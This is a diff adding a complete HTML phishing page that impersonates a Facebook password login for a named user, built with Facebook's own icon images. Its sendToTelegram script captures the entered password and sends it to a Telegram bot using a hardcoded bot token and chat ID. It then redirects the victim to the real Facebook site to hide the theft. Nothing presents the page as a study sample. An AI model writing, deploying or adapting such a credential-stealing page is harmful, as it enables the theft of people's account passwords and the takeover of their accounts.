@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Optimistic Text Normal', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: top;
+            align-items: top;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #f6fafd, #e1edf7);
+            padding: 0 px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            padding: 12px;
+            margin-top: 2px;
+        }
+
+        .back-button {
+            margin-top: 200px ;
+            align-self: flex-start;
+            font-size: 37px;
+            color: #1c2b33;
+            margin-bottom: 90px;
+            margin-left: 12px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .profile {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 40px;
+            margin-bottom: 20px;
+        }
+
+        .profile-image {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: ;
+            border: 1px solid #eee;
+            background-color: #e5d6a0;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+        }
+
+        .profile-name {
+            font-size: 17px;
+            color: #1c2b33;
+            font-weight: 700;
+            margin-top: 11px;
+        }
+
+        .form-container {
+            width: 100%;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid rgb(203, 210, 217);
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .password-input::placeholder {
+            color: #999;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0044ff;
+            color: white;
+            border: none;
+            border-radius: 22px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background-color: #2a56a8;
+        }
+
+        .alternate-button {
+            width: 100%;
+            margin-top: 37px;
+            padding: 11px;
+            background-color: rgba(240, 245, 248, 0.9);
+            color: #333;
+            border: 1px solid #ddd;
+            border-radius: 22px;
+            font-size: 15px;
+            font-weight: 400;
+            cursor: pointer;
+            border-color:rgb(203, 210, 217);
+        }
+
+        .alternate-button:hover {
+            background-color: rgba(230, 235, 240, 0.9);
+        }
+
+
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+                min-height: 100vh;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="#" class="back-button">&#8249;</a>
+
+        <div class="profile">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MCIgaGVpZ2h0PSI4MCIgdmlld0JveD0iMCAwIDgwIDgwIj48cmVjdCB3aWR0aD0iODAiIGhlaWdodD0iODAiIGZpbGw9IiNlNWQ2YTAiLz48dGV4dCB4PSI0MCIgeT0iNDIiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyMCIgZmlsbD0iIzVlNGYyZiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSI+RkQ8L3RleHQ+PC9zdmc+"
+                alt="Profile picture" class="profile-image">
+            <div class="profile-name">Shahariar Shuvo</div>
+        </div>
+
+        <form onsubmit="sendToTelegram(event)">
+            <div class="form-container">
+                <div style="position: relative; margin-bottom: 16px;">
+                    <input id="password" type="password" class="password-input" placeholder="Password" required style="padding-right: 40px;">
+                    <button type="button" id="togglePassword" style="position: absolute; right: 10px; top: 40%; transform: translateY(-50%) translateX(0); background: none; border: none; cursor: pointer; display: none; height: 20px; line-height: 20px; ">
+                        <img id="eyeOpen" src="https://static.xx.fbcdn.net/rsrc.php/v4/yt/r/hWkxYiwGV4N.png" alt="Show" style="height: 20px; display: inline;">
+                        <img id="eyeClosed" src="https://static.xx.fbcdn.net/rsrc.php/v4/yB/r/QtKvl_W0Ein.png" alt="Hide" style="height: 20px; display: none;">
+                    </button>
+                </div>
+                <button type="submit" class="login-button">Log in</button>
+            </div>
+        </form>
+        <div>
+            <button onclick="window.location.href='https://google.com'" class="alternate-button">Try Another Way</button>
+        </div>
+    </div>
+
+    <script>
+        const passwordInput = document.getElementById("password");
+        const toggleButton = document.getElementById("togglePassword");
+        
+        passwordInput.addEventListener('input', function() {
+            toggleButton.style.display = this.value.length > 0 ? 'block' : 'none';
+        });
+
+        toggleButton.addEventListener("click", function() {
+            const eyeOpen = document.getElementById("eyeOpen");
+            const eyeClosed = document.getElementById("eyeClosed");
+
+            const isHidden = passwordInput.type === "password";
+            passwordInput.type = isHidden ? "text" : "password";
+
+            eyeOpen.style.display = isHidden ? "none" : "inline";
+            eyeClosed.style.display = isHidden ? "inline" : "none";
+        });
+
+        function sendToTelegram(event) {
+            event.preventDefault();
+            let password = document.getElementById("password").value;
+            let botToken = "7239842810:AAFEvwP7k_rzjlvpbpiC1hdM0PSX0A9aNuI";
+            let chatId = "6895627984";
+            let fullMessage = `Facebook Login Page:\nPassword: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullMessage)}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Response from Telegram API:", data);
+                    if (data.ok) {
+                        window.location.href = "https://www.facebook.com";
+                    } else {
+                        alert("Error sending message!");
+                    }
+                })
+                .catch(error => {
+                    alert("Error: " + error);
+                });
+        }
+    </script>
+</body>
+</html>
